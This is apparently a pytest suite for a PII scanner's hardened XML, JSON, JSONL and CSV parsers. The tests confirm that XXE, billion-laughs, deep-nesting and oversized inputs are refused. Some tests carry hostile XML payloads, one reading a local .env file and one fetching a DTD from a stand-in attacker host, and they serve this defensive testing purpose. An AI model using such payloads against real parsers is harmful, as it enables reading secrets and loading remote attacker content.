"""Guardrail G12 — hardened structured parsing.

Addresses review finding SEC-10. A scan request must never become a file-read
primitive, and a few hundred bytes of input must never exhaust memory.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from pii_agent.utils.config import MAX_JSON_DEPTH
from pii_agent.utils.safe_parsers import (
    ParseRefused,
    parse_csv,
    parse_json,
    parse_jsonl,
    parse_or_fallback,
    parse_xml,
)

FIXTURES = Path(__file__).parent.parent / "fixtures"


# ---------------------------------------------------------------------------
# XXE
# ---------------------------------------------------------------------------


def test_xxe_external_entity_is_not_resolved():
    """The attack this tool would otherwise enable against itself."""
    payload = """<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY leak SYSTEM "file:///c:/AI/.env">]>
<root><data>&leak;</data></root>"""
    with pytest.raises(ParseRefused) as exc:
        parse_xml(payload)
    assert "disabled for security" in str(exc.value)


def test_xxe_fixture_is_refused():
    payload = (FIXTURES / "sample_xxe.xml").read_text(encoding="utf-8")
    with pytest.raises(ParseRefused):
        parse_xml(payload)


def test_xxe_does_not_leak_file_content_into_fields():
    """Even if parsing somehow succeeded, no env content may appear."""
    payload = (FIXTURES / "sample_xxe.xml").read_text(encoding="utf-8")
    try:
        document = parse_xml(payload)
    except ParseRefused:
        return  # refused outright, which is the expected path
    flattened = document.scannable_text()
    assert "OPENAI_API_KEY" not in flattened
    assert "sk-" not in flattened


def test_billion_laughs_is_refused():
    payload = (FIXTURES / "sample_billion_laughs.xml").read_text(encoding="utf-8")
    with pytest.raises(ParseRefused) as exc:
        parse_xml(payload)
    assert "disabled for security" in str(exc.value)


def test_parameter_entity_is_refused():
    payload = """<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY % pe SYSTEM "http://attacker.example/evil.dtd"> %pe;]>
<root/>"""
    with pytest.raises(ParseRefused):
        parse_xml(payload)


def test_wellformed_xml_still_parses():
    """Hardening must not break legitimate input."""
    document = parse_xml(
        "<records><user id='7'><email>a@b.com</email></user></records>"
    )
    values = [f.value for f in document.fields]
    assert "a@b.com" in values
    assert "7" in values  # attribute values are scanned


def test_xml_attribute_names_are_scanned():
    """A key named 'password' is a signal even with a dull value."""
    document = parse_xml("<config password='x'/>")
    keys = [f.value for f in document.fields if f.is_key]
    assert "password" in keys


# ---------------------------------------------------------------------------
# JSON limits
# ---------------------------------------------------------------------------


def test_deeply_nested_json_is_refused_before_recursion_exhaustion():
    payload = '{"a":' * (MAX_JSON_DEPTH + 50) + "null" + "}" * (MAX_JSON_DEPTH + 50)
    with pytest.raises(ParseRefused) as exc:
        parse_json(payload)
    assert "nests deeper" in str(exc.value)


def test_deep_json_fixture_is_refused():
    payload = (FIXTURES / "sample_deep.json").read_text(encoding="utf-8")
    with pytest.raises(ParseRefused):
        parse_json(payload)


def test_json_depth_limit_does_not_reject_reasonable_nesting():
    payload = '{"a":' * 20 + "1" + "}" * 20
    assert parse_json(payload).max_depth <= 21


def test_malformed_json_error_names_position_not_content():
    """Parser messages routinely quote input; ours must not."""
    with pytest.raises(ParseRefused) as exc:
        parse_json('{"ssn": "482-71-9053"')
    message = str(exc.value)
    assert "line" in message
    assert "482-71-9053" not in message


def test_json_property_names_are_extracted_for_scanning():
    document = parse_json('{"api_key": "abc", "nested": {"password": "x"}}')
    keys = [f.value for f in document.fields if f.is_key]
    assert "api_key" in keys
    assert "password" in keys


def test_json_field_paths_preserve_context():
    document = parse_json('{"user": {"email": "a@b.com"}}')
    paths = {f.path for f in document.fields}
    assert "user.email" in paths


def test_json_arrays_are_indexed():
    document = parse_json('{"ips": ["10.0.0.1", "10.0.0.2"]}')
    paths = {f.path for f in document.fields}
    assert "ips[0]" in paths


# ---------------------------------------------------------------------------
# JSONL
# ---------------------------------------------------------------------------


def test_jsonl_parses_each_line():
    document = parse_jsonl('{"a":1}\n{"b":2}\n')
    paths = {f.path for f in document.fields}
    assert any("line[1]" in p for p in paths)
    assert any("line[2]" in p for p in paths)


def test_jsonl_tolerates_a_truncated_final_line():
    """Log files routinely end mid-write; refusing the file would be unhelpful."""
    document = parse_jsonl('{"a":1}\n{"b":')
    values = [f.value for f in document.fields]
    assert '{"b":' in values


def test_jsonl_ignores_blank_lines():
    document = parse_jsonl('{"a":1}\n\n\n{"b":2}\n')
    assert document.node_count > 0


# ---------------------------------------------------------------------------
# CSV
# ---------------------------------------------------------------------------


def test_csv_header_becomes_field_context():
    document = parse_csv("name,ssn\nJane,482-71-9053\n")
    paths = {f.path for f in document.fields}
    assert any("ssn" in p for p in paths)


def test_csv_header_names_are_scanned_as_keys():
    document = parse_csv("api_key,password\nx,y\n")
    keys = [f.value for f in document.fields if f.is_key]
    assert "api_key" in keys


def test_csv_excessive_field_count_is_refused():
    from pii_agent.utils.config import MAX_CSV_FIELDS

    row = ",".join(["x"] * (MAX_CSV_FIELDS + 10))
    with pytest.raises(ParseRefused) as exc:
        parse_csv(f"h\n{row}\n")
    assert "fields" in str(exc.value)


def test_csv_excessive_row_length_is_refused():
    from pii_agent.utils.config import MAX_CSV_ROW_CHARS

    with pytest.raises(ParseRefused) as exc:
        parse_csv("h\n" + "x" * (MAX_CSV_ROW_CHARS + 100) + "\n")
    assert "characters" in str(exc.value)


def test_healthcare_csv_fixture_parses():
    payload = (FIXTURES / "sample_healthcare.csv").read_text(encoding="utf-8")
    document = parse_csv(payload)
    assert document.node_count > 10
    assert any("mrn" in f.path for f in document.fields)


# ---------------------------------------------------------------------------
# Fallback behaviour
# ---------------------------------------------------------------------------


def test_fallback_scans_as_text_when_structure_is_unparseable():
    """Losing field context is acceptable; losing coverage is not."""
    broken = '{"ssn": "482-71-9053"'
    scannable, document = parse_or_fallback(broken, ".json")
    assert document is None
    assert "482-71-9053" in scannable


def test_fallback_preserves_content_for_refused_xml():
    payload = (FIXTURES / "sample_xxe.xml").read_text(encoding="utf-8")
    scannable, document = parse_or_fallback(payload, ".xml")
    assert document is None
    # The literal text is still scannable even though parsing was refused.
    assert "Jane Fairweather" in scannable


def test_unstructured_extension_passes_through():
    scannable, document = parse_or_fallback("plain log line", ".log")
    assert document is None
    assert scannable == "plain log line"


def test_structured_parse_adds_field_paths():
    scannable, document = parse_or_fallback('{"user":{"email":"a@b.com"}}', ".json")
    assert document is not None
    assert "user.email" in scannable
